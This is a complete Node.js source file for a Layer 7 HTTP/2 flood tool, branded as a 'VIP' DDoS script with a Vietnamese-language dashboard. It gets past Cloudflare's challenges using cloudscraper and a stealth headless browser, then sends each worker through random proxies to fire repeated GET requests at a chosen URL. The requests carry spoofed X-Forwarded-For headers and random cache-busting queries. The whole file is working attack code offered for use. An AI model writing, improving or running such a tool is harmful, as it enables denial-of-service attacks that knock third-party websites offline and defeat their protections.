const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require("colors");
const os = require("os"); // Module hệ thống
const cloudscraper = require("cloudscraper");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

puppeteer.use(StealthPlugin());

const teleOwner = "@Nhatdz29";
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    connect: process.argv.includes('--connect') ? parseInt(process.argv[process.argv.indexOf('--connect') + 1]) : 10,
    pipeline: process.argv.includes('--pipeline') ? parseInt(process.argv[process.argv.indexOf('--pipeline') + 1]) : 1,
    uaFile: process.argv.includes('--ua-file') ? process.argv[process.argv.indexOf('--ua-file') + 1] : null,
    query: process.argv.includes('--query')
};

function genIp() { return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; }

// Hàm tính toán % CPU sử dụng
function getCpuUsage() {
    const cpus = os.cpus();
    let user = 0, nice = 0, sys = 0, idle = 0, irq = 0;
    for (const cpu of cpus) {
        user += cpu.times.user;
        nice += cpu.times.nice;
        sys += cpu.times.sys;
        idle += cpu.times.idle;
        irq += cpu.times.irq;
    }
    const total = user + nice + sys + idle + irq;
    return ((1 - idle / total) * 100).toFixed(1);
}

function showFinalReport() {
    console.log("\n");
    console.log("═════════════════════════════════════════════════════════════".rainbow);
    console.log("                🏁 ATTACK FINISHED 🏁                ".bold.white);
    console.log("═════════════════════════════════════════════════════════════".rainbow);
    console.log("       [👑] CHỦ SỞ HỮU  : ".yellow + `${teleOwner}`.cyan.bold);
    console.log("       [🎯] MỤC TIÊU    : ".yellow + `${args.target}`.white);
    console.log("       [⏱️] THỜI GIAN   : ".yellow + `${args.time} giây`.white);
    console.log("       [🚀] TRẠNG THÁI  : ".yellow + "HOÀN THÀNH XUẤT SẮC".green.bold);
    console.log("═════════════════════════════════════════════════════════════".rainbow);
    process.exit(0);
}

async function solveWithBrowser(target) {
    console.log(`[🛡️] Đang dùng Puppeteer húc Cloudflare...`.yellow);
    const browser = await puppeteer.launch({ headless: "new", args: ['--no-sandbox', '--disable-setuid-sandbox'] });
    const page = await browser.newPage();
    try {
        await page.goto(target, { waitUntil: 'networkidle2', timeout: 60000 });
        await new Promise(r => setTimeout(r, 10000));
        const cookies = await page.cookies();
        const ua = await page.evaluate(() => navigator.userAgent);
        await browser.close();
        return { cookie: cookies.map(c => `${c.name}=${c.value}`).join('; '), ua: ua };
    } catch (e) {
        await browser.close();
        return null;
    }
}

if (cluster.isMaster) {
    console.clear();
    console.log(`\n🌟 STAR-VIP V12.0 ULTIMATE DASHBOARD BY ${teleOwner} 🌟`.brightCyan.bold);
    
    if (!args.target || !args.proxyFile) {
        console.log(`Usage: node script.js <url> <time> <rate> <threads> <proxy> --ua-file ua.txt`.red);
        process.exit();
    }

    cloudscraper.get(args.target, async (err, res) => {
        let tokens = null;
        if (err) {
            console.log(`[⚠️] Cloudscraper bị chặn. Chuyển sang GOD-MODE...`.magenta);
            tokens = await solveWithBrowser(args.target);
        } else {
            console.log(`[✅] Cloudscraper lấy Token thành công!`.green);
            tokens = { cookie: res.request.headers.cookie || "", ua: res.request.headers['User-Agent'] };
        }

        if (!tokens) {
            console.log(`[❌] Không thể vượt qua Cloudflare!`.red);
            process.exit(1);
        }

        console.log(`[🔥] ĐANG KHAI HỎA TRÊN ${args.threads} LUỒNG...`.red.bold);
        for (let i = 0; i < args.threads; i++) cluster.fork({ COOKIE: tokens.cookie, UA: tokens.ua });

        let remaining = args.time;
        const timer = setInterval(() => {
            remaining--;
            
            // Lấy thông số hệ thống
            const cpu = getCpuUsage();
            const ramUsed = (os.totalmem() - os.freemem()) / (1024 * 1024 * 1024);
            const ramTotal = os.totalmem() / (1024 * 1024 * 1024);
            const ramPercent = ((ramUsed / ramTotal) * 100).toFixed(1);

            // In Dashboard thời gian thực
            process.stdout.write(
                `\r[⏳] ${remaining}s | ` + 
                `[💻 CPU: ${cpu}%] `.yellow + 
                `[🧠 RAM: ${ramUsed.toFixed(1)}GB/${ramTotal.toFixed(1)}GB (${ramPercent}%)] `.cyan +
                `[🚀 BẮN!]`.red
            );

            if (remaining <= 0) {
                clearInterval(timer);
                showFinalReport();
            }
        }, 1000);
    });

} else {
    // --- WORKER (BỎ QUA DEBUG ĐỂ GIẢM LAG) ---
    const proxies = fs.readFileSync(args.proxyFile, 'utf-8').split(/\r?\n/).filter(Boolean);
    const userAgents = args.uaFile ? fs.readFileSync(args.uaFile, 'utf-8').split(/\r?\n/).filter(Boolean) : [process.env.UA];
    const parsedTarget = url.parse(args.target);

    function attack() {
        for (let c = 0; c < args.connect; c++) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
            const socket = net.connect({ host: proxy[0], port: parseInt(proxy[1]) }, () => {
                socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
                socket.once('data', () => {
                    const tlsConn = tls.connect({ socket: socket, ALPNProtocols: ['h2'], servername: parsedTarget.host, rejectUnauthorized: false }, () => {
                        const client = http2.connect(args.target, { createConnection: () => tlsConn });
                        client.on('connect', () => {
                            setInterval(() => {
                                for (let i = 0; i < args.rate; i++) {
                                    for (let j = 0; j < args.pipeline; j++) {
                                        client.request({
                                            ":method": "GET",
                                            ":path": parsedTarget.path + (args.query ? `?${crypto.randomBytes(4).toString('hex')}` : ''),
                                            "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                                            "cookie": process.env.COOKIE,
                                            "x-forwarded-for": genIp(),
                                            "cache-control": "no-cache"
                                        }).end();
                                    }
                                }
                            }, 1000);
                        });
                        client.on('error', () => { client.destroy(); tlsConn.destroy(); });
                    });
                });
            });
            socket.on('error', () => socket.destroy());
        }
    }
    attack();
}

